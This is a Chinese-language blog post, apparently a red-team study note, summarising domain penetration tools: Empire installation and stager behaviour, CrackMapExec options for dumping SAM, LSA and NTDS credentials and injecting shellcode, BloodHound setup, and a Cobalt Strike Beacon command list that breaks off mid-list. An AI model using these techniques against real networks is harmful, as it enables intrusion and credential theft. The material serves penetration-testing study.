<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>shackle</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="shackle">
<meta property="og:url" content="https://shackles.top/index.html">
<meta property="og:site_name" content="shackle">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="shackle">
  
    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo1.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo1.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
/*    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}*/


  </style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/home.css" >
  

  

  

  
  
  

</head>



  <body>


  
    <header id="header">

	<!-- 背景图模式 -->
	

    
      <div id="intrologo" class="intro-logo" style="background-position:center; background-repeat:no-repeat; background-image: url(); background-size: auto 100%;">

      <!-- Support rolling -->  
        
        <section class="awSlider">
          <div class="carousel slide carousel-fade " data-ride="carousel">

            <!-- Wrapper for slides -->
            <div class="carousel-inner">
               
                  
                    <div class="item active">
                  
                    <img id="carousel-img0" src="http://wfwewefw.yuxuni.cn/wqfe.jpg">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img0 = new Image();
                      var imageTag0 = document.getElementById("carousel-img0");
                      img0.src = imageTag0.src;
                      img0.onload=function(){
                        if (img0.width / img0.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag0.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag0.style.height = document.body.clientHeight + "px";
                          imageTag0.style.marginLeft = -(document.body.clientHeight * img0.width / img0.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img1" src="https://source.unsplash.com/1920x1080/?nature">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img1 = new Image();
                      var imageTag1 = document.getElementById("carousel-img1");
                      img1.src = imageTag1.src;
                      img1.onload=function(){
                        if (img1.width / img1.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag1.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag1.style.height = document.body.clientHeight + "px";
                          imageTag1.style.marginLeft = -(document.body.clientHeight * img1.width / img1.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img2" src="https://source.unsplash.com/collection/954550/1920x1080">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img2 = new Image();
                      var imageTag2 = document.getElementById("carousel-img2");
                      img2.src = imageTag2.src;
                      img2.onload=function(){
                        if (img2.width / img2.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag2.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag2.style.height = document.body.clientHeight + "px";
                          imageTag2.style.marginLeft = -(document.body.clientHeight * img2.width / img2.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
            </div>

            <!-- Controls -->
            <a class="left carousel-control" href=".carousel" role="button" data-slide="prev">
              <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
              <span class="sr-only">Geri</span>
            </a>
            <a class="right carousel-control" href=".carousel" role="button" data-slide="next">
              <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
              <span class="sr-only">İleri</span>
            </a>
          </div>
        </section>
        <script>
          $('section.awSlider .carousel').carousel({
              pause: '',
              interval: 5000
          });
          var startImage = $('section.awSlider .item.active > img').attr('src');
          $('section.awSlider .carousel').on('slid.bs.carousel', function () {
              var bscn = $(this).find('.item.active > img').attr('src');
              $('section.awSlider > img').attr('src', bscn);
          });
        </script>
      

    
 


    <canvas width="100%" height="100%"></canvas>
    <script>
      var c = document.getElementsByTagName('canvas')[0],
          x = c.getContext('2d'),
          w = window.innerWidth,
          h = window.innerHeight,
          pr = window.devicePixelRatio || 1,
          f = 90,
          q,
          m = Math,
          r = 0,
          u = m.PI*2,
          v = m.cos,
          z = m.random
      c.width = w*pr
      c.height = h*pr
      x.scale(pr, pr)
      x.globalAlpha = 0.6

      <!-- 折线Polyline背景 -->
      
    </script>
    

    
      <div id="homelogo" class="homelogo" style="background: rgba(255,255,255,1);"> 
    

        
          <div class="homelogoback"  style="border: 1px solid #404040;" >
            <h1><a href="#content" id="logo">shackle</a></h1>
            <h3></h3>
            <h5>shackle</h5>
            <!-- <p><a href="https://github.com/iTimeTraveler" target="_blank">Github</a></p> -->
          </div>
        
    
    </div>
  </div>

  <!-- 自适应主页背景大图 -->
  

 <!-- home_logo_image居中 -->
 
    <script>
        var homelogodiv = document.getElementById("homelogo");
        if (document.all.homelogo.offsetWidth > document.body.clientWidth) {
          homelogodiv.style.width = document.body.clientWidth + "px";
          homelogodiv.style.marginLeft = document.body.clientWidth * -0.5 + "px";
        } else {
          homelogodiv.style.width = homelogodiv.clientWidth  + "px";
          homelogodiv.style.marginLeft = (homelogodiv.clientWidth)  * -0.5 + "px";
        }
    </script>
  

  <div class="intro-navigate">
      <p class="navigater-list">
        
          <a id="beautifont" class="main-nav-link" href="/">首页</a>
        
          <a id="beautifont" class="main-nav-link" href="/archives">归档</a>
        
          <a id="beautifont" class="main-nav-link" href="/about">关于</a>
        
      </p>
  </div>

</header>
  
  <div id="container">
    <div id="wrap">
      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;">
  
    <article id="post-域渗透实战简单总结"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/10/29/域渗透实战简单总结/">域渗透实战简要总结</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/10/29/域渗透实战简单总结/" class="article-date">
	  <time datetime="2018-10-28T17:03:56.000Z" itemprop="datePublished">2018-10-29</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="域渗透实战简要总结"><a href="#域渗透实战简要总结" class="headerlink" title="域渗透实战简要总结"></a>域渗透实战简要总结</h1><blockquote>
<p>本文记录域渗透的一些Tip与坑点，感觉内网渗透，只要英语好，一切都不是事情。老外们的技术与分享精神好多干货，学无止境。</p>
</blockquote>
<p>不断更新ing~</p>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><blockquote>
<p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
</blockquote>
<p>​    Empire是基于Powershell后渗透框架，之前NSA的武器库中就有这个神器。我这里的是2.5版本的，提供rest API，有PHP版本和官方node.js版的前端。但这些GUI都不好用，有不少Bug。另外需要注意的是Empire版本问题，版本的命令可以有所差别,官方文档也是更新不及时。</p>
<p>可参考徐大大的两篇文章，版本是2.3。</p>
<h5 id="一篇文章精通PowerShell-Empire-2-3（下）"><a href="#一篇文章精通PowerShell-Empire-2-3（下）" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（下）"></a>一篇文章精通PowerShell Empire 2.3（下）</h5><p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87328</a></p>
<h5 id="一篇文章精通PowerShell-Empire-2-3（下）-1"><a href="#一篇文章精通PowerShell-Empire-2-3（下）-1" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（下）"></a>一篇文章精通PowerShell Empire 2.3（下）</h5><p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87333</a></p>
<p>如下安装命令，官方提供了一键脚本，linux下kali与ubuntu都是支持的。项目原理是类似Metasploit、先建立Listeners，这里话简单看一写它的架构。</p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/UqKswX6rtV34.png?imageslim" alt="mark"></p>
<p>​    安装很简单，apt下载些包，pip安装python依赖。自动安装，最后需要设置数据库密码。也可以用data，目录下的rest.sh重置数据库。项目结构很清晰。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br><span class="line"></span><br><span class="line">cd Empire</span><br><span class="line"></span><br><span class="line">cd setup</span><br><span class="line"></span><br><span class="line">sudo ./install.sh</span><br><span class="line"></span><br><span class="line">python empire --rest --username admin --password password</span><br></pre></td></tr></table></figure>
<p>启动  开启1337端口，rest api。</p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/nrz5mH5Ah9Kl.png?imageslim" alt="mark"></p>
<h5 id="常用命令-直接help"><a href="#常用命令-直接help" class="headerlink" title="常用命令  直接help"></a>常用命令  直接help</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listenters</span><br><span class="line">help</span><br></pre></td></tr></table></figure>
<p>​    这里的module，分python版和powershell，不用多说啦，powershell只是用在windows平台下面，modules下面的文件只是python入口文件最后调用的还是data文件夹下面的powershell payload。python版的用在，linux与osx下面。大概分为下面几个大类。需要看到的时候在help就可以了。</p>
<blockquote>
<p><a href="https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md" target="_blank" rel="noopener">https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code_execution	代码执行</span><br><span class="line">collection		信息收集</span><br><span class="line">credentials		凭证	</span><br><span class="line">exfiltration	数据窃取</span><br><span class="line">exploitation</span><br><span class="line">lateral_movement 横向</span><br><span class="line">management		管理</span><br><span class="line">persistence		权限维持</span><br><span class="line">privesc		提权</span><br><span class="line">recon		侦查</span><br><span class="line">situational_awareness</span><br><span class="line">trollsploit</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/558WMKnNVaYQ.png?imageslim" alt="mark"></p>
<p>usestager</p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/zwIq1GaC13ke.png?imageslim" alt="mark"></p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/IlOV34AFS20x.png?imageslim" alt="mark"></p>
<p>​    </p>
<p>​    用Base64解码。看到发送的Python payload，大概的原理是客户端先判断有没有Little Snitch，直接用python2中原生urllib2库请求我们Empire 的http listener，的ip地址端口，这里的listener是由flask提供server，验证客户端来的cookie，相当于模拟正常的web流量。加密混淆建立个长连接。同样Powershell也这个原理。</p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/59MxERtRsAzf.png?imageslim" alt="mark"></p>
<p>payload执行后，还要rm。</p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/wrfQjtc5bam7.png?imageslim" alt="mark"></p>
<p>客户端执行后，agent上线。</p>
<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/FobbiBWwAvyX.png?imageslim" alt="mark"></p>
<p>接下来就可以进行后渗透攻击。</p>
<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><blockquote>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
<p><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" target="_blank" rel="noopener">https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/</a></p>
</blockquote>
<p>作者两篇文章，由于文章早点现在这些命令有些不同。</p>
<p><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></p>
<p><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html</a></p>
<p>这个项目是一些之前的项目的集成、</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Impacket</span><br><span class="line">Pywinrm</span><br><span class="line">Pywerview</span><br><span class="line">PowerSploit</span><br><span class="line">Invoke-Obfuscation</span><br><span class="line">Invoke-Vnc</span><br><span class="line">Mimikittenz</span><br><span class="line">NetRipper</span><br><span class="line">RandomPS-Scripts</span><br><span class="line">SessionGopher</span><br><span class="line">Mimipenguin</span><br></pre></td></tr></table></figure>
<p>kali 下面一键安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br></pre></td></tr></table></figure>
<p>值得注意的是项目的cmedb 命令可以用Empire的 Rest Api</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec	参数：</span><br><span class="line">  target	包含目标列表的目标IP，范围，CIDR（s），主机名，FQDN或文件</span><br><span class="line"></span><br><span class="line">可选参数：</span><br><span class="line">  -h,--help			显示此帮助消息并退出</span><br><span class="line">  -v,--version		显示程序的版本号并退出</span><br><span class="line">  -t 	THREADS		设置要使用的并发线程数（默认值：100）</span><br><span class="line">  -id CRED_ID [CRED_ID ...]		  用于身份验证的数据库凭据ID</span><br><span class="line">  -u USERNAME [USERNAME ...]	   用户名或包含用户名的文件</span><br><span class="line">  -d DOMAIN				域名</span><br><span class="line">  --local-auth在本地验证每个目标</span><br><span class="line">  -p PASSWORD [PASSWORD ...]		 包含密码的密码或文件</span><br><span class="line">  -H HASH [HASH ...] 				NTLM哈希值或包含NTLM哈希值的文件</span><br><span class="line">  -M MODULE， --Module模块				有效负载模块使用</span><br><span class="line">  -o MODULE_OPTION [MODULE_OPTION ...]                  有效载荷模块选项</span><br><span class="line">  -L，--list-modules列出可用模块</span><br><span class="line">  --show-options			显示模块选项</span><br><span class="line">  --share SHARE				指定共享（默认值：C $）</span><br><span class="line">  --smb-port &#123;139,445&#125; 		SMB端口（默认值：445）</span><br><span class="line">  --mssql-port PORT 		MSSQL端口（默认值：1433）</span><br><span class="line">  --server &#123;http，https&#125;  		使用所选服务器（默认值：https）</span><br><span class="line">  --server-host HOST 				IP将服务器绑定到（默认值：0.0.0.0）</span><br><span class="line">  --server-port PORT			在指定端口上启动服务器</span><br><span class="line">  --timeout TIMEOUT			每个线程的最大超时时间（秒）（默认值：20）</span><br><span class="line">  --gfail-limit 			LIMIT全局失败登录尝试的最大数量</span><br><span class="line">  --ufail-limit 			LIMIT每个用户名的最大失败登录尝试次数</span><br><span class="line">  --fail-limit 				LIMIT每个主机的最大失败登录尝试次数</span><br><span class="line">  --verbose启用详细输出</span><br><span class="line"></span><br><span class="line">凭证收集：</span><br><span class="line">  收集凭据的选项</span><br><span class="line"></span><br><span class="line">  --sam Dump来自目标系统的SAM哈希值</span><br><span class="line">  --lsa从目标系统中转储LSA的秘密</span><br><span class="line">  --ntds &#123;vss，drsuapi&#125;使用指定的方法从目标DC转储NTDS.ditdrsuapi是最快的）</span><br><span class="line">  --ntds-history转储NTDS.dit密码历史记录</span><br><span class="line">  --ntds-pwdLastSet显示每个NTDS.dit帐户的pwdLastSet属性</span><br><span class="line">  --wdigest &#123;enable，disable&#125; 创建/删除'UseLogonCredential'注册表项，在Windows上启用WDigest信用转储&gt; = 8.1</span><br><span class="line"></span><br><span class="line">制图/枚举：</span><br><span class="line">  映射/枚举选项</span><br><span class="line"></span><br><span class="line">  --shares枚举共享和访问权限</span><br><span class="line">  --uac检查UAC状态</span><br><span class="line">  --sessions枚举活动会话</span><br><span class="line">  --disks枚举磁盘</span><br><span class="line">  --users枚举用户</span><br><span class="line">  --rid-brute [MAX_RID] 通过强制RID枚举用户（默认值：4000）</span><br><span class="line">  --pass-pol转储密码策略</span><br><span class="line">  --lusers枚举已登录的用户</span><br><span class="line">  --wmi QUERY发出指定的WMI查询</span><br><span class="line">  --wmi-namespace NAMESPACEWMI命名空间（默认值：//./root/cimv2）</span><br><span class="line"></span><br><span class="line">爬虫：</span><br><span class="line">  爬虫的选择</span><br><span class="line"></span><br><span class="line">  --spider [FOLDER]文件夹到蜘蛛（默认：根目录）</span><br><span class="line">  --content启用文件内容搜索</span><br><span class="line">  --exclude-dirs DIR_LIST目录排除蜘蛛</span><br><span class="line">  --pattern PATTERN [PATTERN ...]要在文件夹，文件名和文件内容中搜索的模式</span><br><span class="line">  --regex REGEX [REGEX ...]正则表达式搜索文件夹，文件名和文件内容</span><br><span class="line">  --depth DEPTH Spider递归深度（默认值：10）</span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">  执行命令的选项</span><br><span class="line"></span><br><span class="line">  --exec-method &#123;smbexec，wmiexec，atexec&#125; 执行命令的方法。在MSSQL模式下忽略（默认值：wmiexec）</span><br><span class="line">  --force-ps32强制PowerShell命令在32位进程中运行</span><br><span class="line">  --no-output不检索命令输出</span><br><span class="line">  -x COMMAND执行指定的命令</span><br><span class="line">  -X PS_COMMAND执行指定的PowerShell命令</span><br><span class="line"></span><br><span class="line">MSSQL交互：</span><br><span class="line">  与MSSQL DB交互的选项</span><br><span class="line">  </span><br><span class="line">  --mssql将crackmapexec切换到MSSQL模式。如果提供凭据，则将对所有发现的MSSQL DB进行身份验证</span><br><span class="line">  --mssql-query QUERY对MSSQL DB执行指定的查询</span><br><span class="line">  --mssql-auth &#123;windows，normal&#125;要使用的MSSQL身份验证类型（默认值：windows）</span><br></pre></td></tr></table></figure>
<p>主要还是以下这些模块。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] empire_exec		使用Empire的RESTful API为指定的侦听器生成启动器并执行它</span><br><span class="line">[*] mimikittenz		执行Mimikittenz</span><br><span class="line">[*] rundll32_exec	使用rundll32和Windows的本机JavaScript解释器执行命令</span><br><span class="line">[*] shellinject		下载指定的原始shellcode并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存</span><br><span class="line">[*] com_exec		使用COM scriptlet执行命令以绕过白名单</span><br><span class="line">[*] enum_chrome		使用Powersploit的Invoke-Mimikatz.ps1脚本解密已保存的Chrome密码</span><br><span class="line">[*] tokens			使用Powersploit的Invoke-TokenManipulation枚举可用的令牌</span><br><span class="line">[*] mimikatz		执行PowerSploit的Invoke-Mimikatz.ps1脚本</span><br><span class="line">[*] powerview Wrapper for PowerView的功能</span><br><span class="line">[*] peinject		下载指定的DLL/EXE并使用PowerSploit的Invoke-ReflectivePEInjection.ps1脚本将其注入内存</span><br><span class="line">[*] tokenrider		允许使用权限而不是转储凭据进行自动令牌枚举，模拟和大规模横向传播</span><br><span class="line">[*] metinject		下载Meterpreter stager并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存</span><br><span class="line">[*] eventvwr_bypass		使用eventvwr.exe无文件UAC绕过执行命令</span><br></pre></td></tr></table></figure>
<h3 id="Bloodhound-域攻击关系图"><a href="#Bloodhound-域攻击关系图" class="headerlink" title="Bloodhound  域攻击关系图"></a>Bloodhound  域攻击关系图</h3><blockquote>
<p><a href="https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collection-Intro" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collection-Intro</a></p>
<p><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" target="_blank" rel="noopener">https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/</a></p>
<p><a href="https://www.youtube.com/watch?v=lxd2rerVsLo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=lxd2rerVsLo</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bloodhound</span><br></pre></td></tr></table></figure>
<p>基于 Neo4j数据库,需要改密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br></pre></td></tr></table></figure>
<p>在终端上执行,GUI界面，输入数据库的地址、端口用户密码。可以多客户端使用，跨平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
<h2 id="CobaltStrke"><a href="#CobaltStrke" class="headerlink" title="CobaltStrke"></a>CobaltStrke</h2><blockquote>
<h5 id="列表集合"><a href="#列表集合" class="headerlink" title="列表集合"></a>列表集合</h5><p><a href="https://github.com/invokethreatguy/CSASC" target="_blank" rel="noopener">https://github.com/invokethreatguy/CSASC</a></p>
</blockquote>
<p>Cobalt Strike 的一些好用的插件，可以让我们更加清楚和方便的进行工作。</p>
<h4 id="Bean-COMMAD"><a href="#Bean-COMMAD" class="headerlink" title="Bean COMMAD"></a>Bean COMMAD</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">EDR_Query		查询所有安装的主要EDR产品的系统</span><br><span class="line">ProcessMonitor	启动/停止并更改进程监视器的间隔时间</span><br><span class="line">RedRepo			一个庞大的命令库和红色团队提示</span><br><span class="line">audit_uac		审核BypassUAC方法成功的主机</span><br><span class="line">browserpivot	设置浏览器数据透视会话</span><br><span class="line">bypassuac		在高完整性过程中生成会话</span><br><span class="line">cancel			取消正在进行的下载</span><br><span class="line">cd				更改目录</span><br><span class="line">check_msbuild	在目标上查找.NET v4.0.30319</span><br><span class="line">checkin			致电主页并发布数据</span><br><span class="line">clear			明确的Bean队列</span><br><span class="line">com-exec		使用DCOM进行横向运动</span><br><span class="line">covertvpn		部署隐蔽VPN客户端</span><br><span class="line">cp				复制文件</span><br><span class="line">dcsync			从DC中提取密码哈希</span><br><span class="line">desktop			桌面查看目标桌面并与之交互</span><br><span class="line">dllinject		将反射DLL注入进程</span><br><span class="line">dllload			使用LoadLibrary（）将DLL加载到进程中</span><br><span class="line">download		下载文件</span><br><span class="line">downloads		列出正在进行的文件下载</span><br><span class="line">drives			列出目标驱动器</span><br><span class="line">elevate			提升尝试提升权限</span><br><span class="line">execute			执行目标执行程序（无输出）</span><br><span class="line">execute-assembly	在目标上执行内存中的本地.NET程序</span><br><span class="line">exit			终止Bean会话</span><br><span class="line">getprivs		启用当前令牌的系统权限</span><br><span class="line">getsystem		尝试获取SYSTEM</span><br><span class="line">getuid			获取用户ID</span><br><span class="line">hashdump		转储密码哈希值</span><br><span class="line">help			帮助菜单</span><br><span class="line">inject			在特定进程中注入一个会话</span><br><span class="line">jobkill			杀死一个长期的后期开发任务</span><br><span class="line">jobs			列出长期运行的后期开发任务</span><br><span class="line">kerberos_ccache_use		将缓存中的kerberos票证应用于此会话</span><br><span class="line">kerberos_ticket_purge	从本次会议中清除kerberos门票</span><br><span class="line">kerberos_ticket_use		将kerberos票证应用于此会话</span><br><span class="line">keylogger		键盘记录器将键击记录器注入进程</span><br><span class="line">kill			杀死一个进程</span><br><span class="line">link			通过SMB连接到Beacon对等端</span><br><span class="line">logonpasswords		使用mimikatz转储凭据和哈希值</span><br><span class="line">ls		列出文件</span><br><span class="line">make_token		创建令牌以传递凭据</span><br><span class="line">mimikatz		运行mimikatz命令</span><br><span class="line">mkdir			制作一个目录</span><br><span class="line">mode dns		使用DNS A作为数据通道（仅限DNSBean）</span><br><span class="line">mode dns-txt		使用DNS TXT作为数据通道（仅限DNSBean）</span><br><span class="line">mode dns6		使用DNS AAAA作为数据通道（仅限DNSBean）</span><br><span class="line">mode http			使用HTTP作为数据通道</span><br><span class="line">mode smb		使用SMB对等通信</span><br><span class="line">mv				移动文件</span><br><span class="line">net				网络和主机枚举工具</span><br><span class="line">note		